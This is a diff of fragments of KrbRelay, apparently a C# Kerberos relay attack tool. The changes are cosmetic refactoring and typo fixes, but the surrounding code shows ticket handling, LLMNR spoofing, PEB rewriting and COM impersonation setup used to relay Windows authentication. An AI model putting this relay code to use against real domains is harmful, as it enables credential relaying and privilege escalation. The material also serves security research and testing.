@@ -58,7 +58,7 @@ namespace KrbRelay
             {
                 uint bytesReturned;
                 bool worked;
-                IntPtr buffer = IntPtr.Zero;
+                IntPtr buffer;
 
                 try { 
                     worked = WTSQuerySessionInformation(IntPtr.Zero, SessionId, WTS_INFO_CLASS.ConnectState, out buffer, out bytesReturned);
@@ -87,23 +87,22 @@ namespace KrbRelay
         }
 
         
-        public static SECURITY_HANDLE ldap_phCredential = new SECURITY_HANDLE();
+        public static SECURITY_HANDLE ldap_phCredential;
         public static IntPtr ld = IntPtr.Zero;
-        public static byte[] apRep1 = new byte[] { };
-        public static byte[] apRep2 = new byte[] { };
-        public static byte[] ticket = new byte[] { };
+        public static byte[] apRep1 = { };
+        public static byte[] apRep2 = { };
+        public static byte[] ticket = { };
         public static string spn = "";
         public static string relayedUser = "";
         public static string relayedUserDomain = "";
         public static string domainDN = "";
         public static string targetFQDN = "";
-        public static bool useSSL = false;
+        public static bool useSSL;
         public static bool stopSpoofing = false;
         public static Dictionary<string, string> attacks = new Dictionary<string, string>();
         public static SMB2Client smbClient = new SMB2Client();
         public static HttpClientHandler handler = new HttpClientHandler();
         public static HttpClient httpClient = new HttpClient();
-        public static CookieContainer CookieContainer = new CookieContainer();
 
         //hooked function
         [STAThread]
@@ -128,7 +127,7 @@ namespace KrbRelay
                 ticket = Helpers.ConvertApReq(ticket);
                 if(ticket[0] != 0x60)
                 {
-                    Console.WriteLine("[-] Recieved invalid apReq, exploit will fail");
+                    Console.WriteLine("[-] Received invalid apReq, exploit will fail");
                     Console.WriteLine("{0}", Helpers.ByteArrayToString(ticket));
                     Environment.Exit(0);
                 }
@@ -650,7 +649,6 @@ namespace KrbRelay
                 return;
             }
 
-
             if (string.IsNullOrEmpty(domain))
             {
                 string[] d = spn.Split('.').Skip(1).ToArray();
@@ -704,7 +702,6 @@ namespace KrbRelay
 
             if (service == "ldap")
             {
-                var ldap_ptsExpiry = new SECURITY_INTEGER();
                 var status = AcquireCredentialsHandle(
                     null,
                     "Negotiate",
@@ -799,7 +796,6 @@ namespace KrbRelay
                 //Console.WriteLine(httpClient.BaseAddress);
             }
 
-
             if (llmnr)
             {
                 if(service == "ldap")
@@ -860,7 +856,7 @@ namespace KrbRelay
             //Console.WriteLine();
             Console.WriteLine("[*] Rewriting PEB");
             //Init RPC server
-            var svcs = new SOLE_AUTHENTICATION_SERVICE[] {
+            var svcs = new[] {
                 new SOLE_AUTHENTICATION_SERVICE() {
                     dwAuthnSvc = 16, // HKLM\SOFTWARE\Microsoft\Rpc\SecurityService sspicli.dll
                     pPrincipalName = spn
@@ -877,7 +873,7 @@ namespace KrbRelay
                 CoInitializeSecurity(IntPtr.Zero, svcs.Length, svcs,
                      IntPtr.Zero, AuthnLevel.RPC_C_AUTHN_LEVEL_DEFAULT,
                      ImpLevel.RPC_C_IMP_LEVEL_IMPERSONATE, IntPtr.Zero,
-                     Natives.EOLE_AUTHENTICATION_CAPABILITIES.EOAC_DYNAMIC_CLOAKING,
+                     EOLE_AUTHENTICATION_CAPABILITIES.EOAC_DYNAMIC_CLOAKING,
                      IntPtr.Zero);
             }
             finally
@@ -894,11 +890,11 @@ namespace KrbRelay
             if (!checkPort(int.Parse(port)))
             {
                 Console.WriteLine("[*] Looking for available ports..");
-                port = checkPorts(new string[] { "SYSTEM" }).ToString();
+                port = checkPorts(new[] { "SYSTEM" }).ToString();
                 if (port == "-1")
                 {
                     Console.WriteLine("[-] No available ports found");
-                    Console.WriteLine("[-] Firwall will block our COM connection. Exiting");
+                    Console.WriteLine("[-] Firewall will block our COM connection. Exiting");
                     return;
                 }
                 Console.WriteLine("[*] Port {0} available", port);
@@ -907,7 +903,7 @@ namespace KrbRelay
             //COM object
             Console.WriteLine("[*] Register com server");
             byte[] ba = ComUtils.GetMarshalledObject(new object());
-            COMObjRefStandard std = (COMObjRefStandard)COMObjRefStandard.FromArray(ba);
+            COMObjRefStandard std = (COMObjRefStandard)COMObjRef.FromArray(ba);
             //Console.WriteLine("[*] IPID: {0}", std.Ipid);
             //Console.WriteLine("[*] OXID: {0:X08}", std.Oxid);
             //Console.WriteLine("[*] OID : {0:X08}", std.Oid);
